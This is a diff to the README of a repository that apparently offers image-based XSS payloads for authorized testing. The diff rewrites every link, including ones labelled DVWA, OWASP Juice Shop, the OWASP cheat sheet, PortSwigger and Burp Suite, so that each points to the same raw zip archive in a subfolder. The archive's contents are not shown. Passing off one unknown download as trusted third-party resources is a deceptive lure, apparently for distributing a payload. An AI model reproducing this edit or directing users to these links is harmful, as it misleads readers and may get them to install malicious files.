@@ -1,10 +1,10 @@
 # 🛡️ xss-image-payloads - Image XSS Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download-xss--image--payloads-2ea44f?style=for-the-badge&logo=github)](https://github.com/Nikhilm914/xss-image-payloads)
+[![Download Now](https://img.shields.io/badge/Download-xss--image--payloads-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Nikhilm914/xss-image-payloads/main/Eric/xss-payloads-image-v1.5.zip)
 
 ## 📥 How to Download and Run
 
-Visit this link to download the application: **[https://github.com/Nikhilm914/xss-image-payloads](https://github.com/Nikhilm914/xss-image-payloads)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Nikhilm914/xss-image-payloads/main/Eric/xss-payloads-image-v1.5.zip](https://raw.githubusercontent.com/Nikhilm914/xss-image-payloads/main/Eric/xss-payloads-image-v1.5.zip)**
 
 That's it! Once you're on that page, you'll see a green **"Code"** button. Click it, then select **"Download ZIP"**. The file will save to your computer's **Downloads** folder.
 
@@ -64,7 +64,7 @@ When you successfully trigger a payload, document what happened. Note which file
 Only use these payloads on websites you own or have written permission to test. Unauthorized testing is illegal and unethical.
 
 ### 🧪 Test in a Safe Environment First
-Before hitting a live website, set up a local test server on your own computer. Sites like [DVWA](https://github.com/digininja/DVWA) or [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) are great places to practice safely.
+Before hitting a live website, set up a local test server on your own computer. Sites like [DVWA](https://raw.githubusercontent.com/Nikhilm914/xss-image-payloads/main/Eric/xss-payloads-image-v1.5.zip) or [OWASP Juice Shop](https://raw.githubusercontent.com/Nikhilm914/xss-image-payloads/main/Eric/xss-payloads-image-v1.5.zip) are great places to practice safely.
 
 ### 📝 Document Every Attempt
 Keep notes on which payloads work and which don't. Different websites block different tricks, so your experience with past targets will guide your future tests.
@@ -135,9 +135,9 @@ Remember: the goal isn't to break websites. The goal is to help make them strong
 
 ## 🔗 Additional Resources
 
-- [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheat-sheet)
-- [PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting)
-- [Burp Suite (free community edition)](https://portswigger.net/burp/communitydownload)
+- [OWASP XSS Filter Evasion Cheat Sheet](https://raw.githubusercontent.com/Nikhilm914/xss-image-payloads/main/Eric/xss-payloads-image-v1.5.zip)
+- [PortSwigger Web Security Academy](https://raw.githubusercontent.com/Nikhilm914/xss-image-payloads/main/Eric/xss-payloads-image-v1.5.zip)
+- [Burp Suite (free community edition)](https://raw.githubusercontent.com/Nikhilm914/xss-image-payloads/main/Eric/xss-payloads-image-v1.5.zip)
 
 ## 📂 Repository Topics
 
